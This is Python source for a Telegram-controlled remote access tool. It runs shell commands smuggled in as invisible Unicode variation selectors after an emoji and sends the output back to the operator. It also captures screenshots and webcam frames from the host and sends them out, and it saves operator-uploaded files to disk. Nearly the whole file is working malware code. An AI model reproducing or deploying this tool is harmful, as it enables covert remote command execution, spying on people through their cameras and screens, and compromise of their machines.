import cv2
import time
import telebot
import subprocess
import pyautogui

VARIATION_SELECTOR_START = 0xFE00
VARIATION_SELECTOR_END = 0xFE0F
VARIATION_SELECTOR_SUPPLEMENT_START = 0xE0100
VARIATION_SELECTOR_SUPPLEMENT_END = 0xE01EF

BOT_API_KEY = "BOT TOKEN"
telegram_user_id = USERID # YOUR ACCOUNT USER ID, MUST BE INT

bot = telebot.TeleBot(BOT_API_KEY)

def from_variation_selector(code_point: int) -> int | None:
    if VARIATION_SELECTOR_START <= code_point <= VARIATION_SELECTOR_END:
        return code_point - VARIATION_SELECTOR_START
    elif VARIATION_SELECTOR_SUPPLEMENT_START <= code_point <= VARIATION_SELECTOR_SUPPLEMENT_END:
        return code_point - VARIATION_SELECTOR_SUPPLEMENT_START + 16
    return None

def decode(text: str) -> str:
    decoded_bytes = []
    for char in text[1:]:  # Skip emoji prefix
        byte = from_variation_selector(ord(char))
        if byte is None:
            break
        decoded_bytes.append(byte)
    return bytes(decoded_bytes).decode("utf-8")

def execute_system_command(cmd):
    max_message_length = 2048
    output = subprocess.getstatusoutput(cmd)
    return str(output[1][:max_message_length])

def verify_telegram_id(id):
    return telegram_user_id == id

def take_screenshot(message):
    if not verify_telegram_id(message.from_user.id):
        return
    
    try:
        screenshot = pyautogui.screenshot()

        timestamp = int(time.time())
        screenshot.save(f"{timestamp}.png")
        with open(f"{timestamp}.png", "rb") as image:
            bot.send_photo(message.from_user.id, image)

        bot.reply_to(message, "[+] Image downloaded")
    except:
        bot.reply_to(message, "[!] Unsuccessful")

@bot.message_handler(commands=['webcam'])
def webcam(message):
    if not verify_telegram_id(message.from_user.id):
        return
    
    try:
        cap = cv2.VideoCapture(0)

        ret, frame = cap.read()
        if ret:
            
            timestamp = int(time.time())
            cv2.imwrite(f"{timestamp}.png", frame)
            
            with open(f"{timestamp}.png", "rb") as image:
                bot.send_photo(message.from_user.id, image)

            cap.release()
    except:
        bot.reply_to(message, "[!] Unsuccessful")

def handle_document_upload(message):
    if not verify_telegram_id(message.from_user.id):
        return
    
    try:
        if message.document:
            
            file_id = message.document.file_id
            file_name = message.document.file_name

            
            file_info = bot.get_file(file_id)
            downloaded_file = bot.download_file(file_info.file_path)

            with open(f"./{file_name}", "wb") as file:
                file.write(downloaded_file)

            bot.reply_to(message, "[+] Upload successful")
    except:
        bot.reply_to(message, "[!] Unsuccessful")


@bot.message_handler()
def handle_encoded_command(message):
    if not verify_telegram_id(message.from_user.id):
        return
    
    decoded_command = decode(message.text)
    # Need to add logic for command handling
    response = execute_system_command(decoded_command)
    bot.reply_to(message, response)

bot.infinity_polling()